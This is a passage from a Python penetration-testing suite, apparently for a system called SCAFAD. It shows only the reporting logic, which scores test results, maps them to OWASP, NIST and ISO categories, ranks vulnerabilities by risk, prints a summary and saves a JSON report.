                    evidence=[f"Test execution failed: {str(e)}"],
                    remediation="Fix security testing framework"
                ))
        
        total_execution_time = time.time() - test_start_time
        
        # Generate security report
        security_report = self.generate_security_report(all_results, total_execution_time)
        
        return security_report
    
    def generate_security_report(self, results: List[SecurityTestResult], total_time: float) -> Dict[str, Any]:
        """Generate comprehensive security assessment report"""
        
        total_tests = len(results)
        passed_tests = sum(1 for r in results if r.passed)
        failed_tests = total_tests - passed_tests
        
        vulnerabilities_found = sum(1 for r in results if r.vulnerability_found)
        successful_attacks = sum(1 for r in results if r.attack_success)
        
        # Categorize results by severity
        by_severity = {}
        for result in results:
            severity = result.severity.value
            if severity not in by_severity:
                by_severity[severity] = {'total': 0, 'passed': 0, 'vulnerable': 0}
            
            by_severity[severity]['total'] += 1
            if result.passed:
                by_severity[severity]['passed'] += 1
            if result.vulnerability_found:
                by_severity[severity]['vulnerable'] += 1
        
        # Categorize by attack category
        by_category = {}
        for result in results:
            category = result.category.value
            if category not in by_category:
                by_category[category] = {'total': 0, 'passed': 0, 'vulnerable': 0}
            
            by_category[category]['total'] += 1
            if result.passed:
                by_category[category]['passed'] += 1
            if result.vulnerability_found:
                by_category[category]['vulnerable'] += 1
        
        # Overall security score (0-100)
        security_score = (passed_tests / total_tests * 100) if total_tests > 0 else 0
        
        # Critical vulnerabilities
        critical_vulnerabilities = [r for r in results 
                                  if r.severity == SecurityTestSeverity.CRITICAL and r.vulnerability_found]
        
        # Determine security posture
        if security_score >= 95 and len(critical_vulnerabilities) == 0:
            security_posture = "EXCELLENT"
        elif security_score >= 85 and len(critical_vulnerabilities) == 0:
            security_posture = "GOOD"
        elif security_score >= 70 and len(critical_vulnerabilities) <= 1:
            security_posture = "ACCEPTABLE"
        else:
            security_posture = "POOR"
        
        # SOC deployment readiness
        if security_posture in ["EXCELLENT", "GOOD"] and len(critical_vulnerabilities) == 0:
            soc_ready = True
            soc_status = "APPROVED"
        elif security_posture == "ACCEPTABLE" and len(critical_vulnerabilities) == 0:
            soc_ready = True
            soc_status = "CONDITIONALLY_APPROVED"
        else:
            soc_ready = False
            soc_status = "NOT_APPROVED"
        
        report = {
            'report_metadata': {
                'generated_at': time.time(),
                'total_execution_time': total_time,
                'scafad_version': '1.0.0',
                'test_environment': 'security_penetration'
            },
            'executive_summary': {
                'security_posture': security_posture,
                'security_score': security_score,
                'soc_deployment_ready': soc_ready,
                'soc_status': soc_status,
                'total_tests': total_tests,
                'tests_passed': passed_tests,
                'tests_failed': failed_tests,
                'vulnerabilities_found': vulnerabilities_found,
                'successful_attacks': successful_attacks,
                'critical_vulnerabilities': len(critical_vulnerabilities)
            },
            'security_by_severity': by_severity,
            'security_by_category': by_category,
            'critical_findings': [r.to_dict() for r in critical_vulnerabilities],
            'detailed_results': [r.to_dict() for r in results],
            'security_recommendations': self.generate_security_recommendations(results),
            'compliance_assessment': self.assess_compliance_standards(results),
            'remediation_priority': self.prioritize_remediation(results)
        }
        
        return report
    
    def generate_security_recommendations(self, results: List[SecurityTestResult]) -> List[str]:
        """Generate security improvement recommendations"""
        recommendations = []
        
        # Analyze failed tests
        failed_results = [r for r in results if not r.passed]
        
        # Group by category
        injection_failures = [r for r in failed_results if r.category == AttackCategory.INJECTION]
        if injection_failures:
            recommendations.append("CRITICAL: Implement comprehensive input validation and parameterized queries")
            recommendations.append("Deploy web application firewall (WAF) with injection attack signatures")
        
        xss_failures = [r for r in failed_results if r.category == AttackCategory.CROSS_SITE_SCRIPTING]
        if xss_failures:
            recommendations.append("HIGH: Implement content security policy (CSP) and output encoding")
            recommendations.append("Enable XSS protection headers and input sanitization")
        
        dos_failures = [r for r in failed_results if "dos" in r.test_name.lower()]
        if dos_failures:
            recommendations.append("HIGH: Implement rate limiting and resource usage controls")
            recommendations.append("Configure timeout mechanisms and input size validation")
        
        info_disclosure = [r for r in failed_results if r.category == AttackCategory.SENSITIVE_DATA_EXPOSURE]
        if info_disclosure:
            recommendations.append("MEDIUM: Implement proper error handling and logging controls")
            recommendations.append("Remove debug information and verbose error messages from production")
        
        # General recommendations based on overall security posture
        vulnerability_count = sum(1 for r in results if r.vulnerability_found)
        if vulnerability_count > 0:
            recommendations.append("Conduct regular security assessments and penetration testing")
            recommendations.append("Implement security monitoring and incident response procedures")
        
        if not recommendations:
            recommendations.append("Excellent security posture! Maintain current security controls and monitoring")
        
        return recommendations
    
    def assess_compliance_standards(self, results: List[SecurityTestResult]) -> Dict[str, Any]:
        """Assess compliance with security standards"""
        
        # OWASP Top 10 mapping
        owasp_coverage = {
            'A01_Broken_Access_Control': 0,
            'A02_Cryptographic_Failures': 0,
            'A03_Injection': sum(1 for r in results if r.category == AttackCategory.INJECTION and r.passed),
            'A04_Insecure_Design': 0,
            'A05_Security_Misconfiguration': sum(1 for r in results if r.category == AttackCategory.SECURITY_MISCONFIGURATION and r.passed),
            'A06_Vulnerable_Components': 0,
            'A07_Identification_Authentication_Failures': 0,
            'A08_Software_Data_Integrity_Failures': 0,
            'A09_Security_Logging_Monitoring_Failures': 0,
            'A10_Server_Side_Request_Forgery': 0
        }
        
        # Calculate coverage percentages
        owasp_tested = sum(1 for v in owasp_coverage.values() if v > 0)
        owasp_total = len(owasp_coverage)
        owasp_score = (owasp_tested / owasp_total * 100) if owasp_total > 0 else 0
        
        return {
            'owasp_top_10': {
                'coverage_score': owasp_score,
                'tested_categories': owasp_tested,
                'total_categories': owasp_total,
                'category_results': owasp_coverage
            },
            'nist_csf_compliance': {
                'identify': True,  # Vulnerability identification
                'protect': sum(1 for r in results if r.passed) / len(results) > 0.8,
                'detect': True,   # Attack detection capabilities
                'respond': True,  # Security controls response
                'recover': False  # Not tested in this suite
            },
            'iso_27001_controls': {
                'access_control': False,  # Not fully tested
                'cryptography': False,    # Not tested
                'operations_security': sum(1 for r in results if r.passed) / len(results) > 0.8,
                'communications_security': True,  # Input validation covers this
                'system_acquisition': False,      # Not applicable
                'supplier_relationships': False   # Not tested
            }
        }
    
    def prioritize_remediation(self, results: List[SecurityTestResult]) -> List[Dict[str, Any]]:
        """Prioritize remediation based on risk assessment"""
        
        vulnerable_results = [r for r in results if r.vulnerability_found]
        
        # Score vulnerabilities by severity and exploitability
        scored_vulns = []
        
        for result in vulnerable_results:
            # Base score from severity
            severity_scores = {
                SecurityTestSeverity.CRITICAL: 10,
                SecurityTestSeverity.HIGH: 8,
                SecurityTestSeverity.MEDIUM: 6,
                SecurityTestSeverity.LOW: 4,
                SecurityTestSeverity.INFO: 2
            }
            
            base_score = severity_scores.get(result.severity, 5)
            
            # Adjust for attack success
            if result.attack_success:
                base_score += 2
            
            # Adjust for category (injection attacks are more critical)
            if result.category == AttackCategory.INJECTION:
                base_score += 2
            elif result.category == AttackCategory.CROSS_SITE_SCRIPTING:
                base_score += 1
            
            scored_vulns.append({
                'test_id': result.test_id,
                'test_name': result.test_name,
                'category': result.category.value,
                'severity': result.severity.value,
                'risk_score': min(base_score, 10),  # Cap at 10
                'remediation': result.remediation,
                'evidence_count': len(result.evidence)
            })
        
        # Sort by risk score (descending)
        scored_vulns.sort(key=lambda x: x['risk_score'], reverse=True)
        
        return scored_vulns


# Main execution
async def main():
    """Execute security penetration tests"""
    test_suite = SecurityPenetrationTestSuite()
    
    # Run comprehensive security tests
    security_report = await test_suite.run_comprehensive_security_tests()
    
    # Print executive summary
    print("\n" + "=" * 50)
    print("🛡️  SECURITY ASSESSMENT SUMMARY")
    print("=" * 50)
    
    summary = security_report['executive_summary']
    print(f"Security Posture: {summary['security_posture']}")
    print(f"Security Score: {summary['security_score']:.1f}/100")
    print(f"SOC Deployment Status: {summary['soc_status']}")
    print(f"Tests Passed: {summary['tests_passed']}/{summary['total_tests']}")
    print(f"Vulnerabilities Found: {summary['vulnerabilities_found']}")
    print(f"Successful Attacks: {summary['successful_attacks']}")
    print(f"Critical Vulnerabilities: {summary['critical_vulnerabilities']}")
    
    # Critical findings
    if summary['critical_vulnerabilities'] > 0:
        print(f"\n🚨 CRITICAL VULNERABILITIES FOUND:")
        for finding in security_report['critical_findings'][:3]:  # Show top 3
            print(f"   - {finding['test_name']}: {finding['category']}")
    
    # Top recommendations
    print(f"\n📋 Top Security Recommendations:")
    for rec in security_report['security_recommendations'][:3]:
        print(f"   • {rec}")
    
    # Save detailed report
    report_filename = f"scafad_security_report_{int(time.time())}.json"
    with open(report_filename, 'w') as f:
        json.dump(security_report, f, indent=2, default=str)
    
    print(f"\n📄 Detailed report saved to: {report_filename}")
    
    if summary['soc_deployment_ready']:
        print("\n🎉 SCAFAD passes security assessment for SOC deployment!")
    else:
        print(f"\n⚠️ Security vulnerabilities must be addressed before SOC deployment")
    
    return security_report


if __name__ == "__main__":
    report = asyncio.run(main())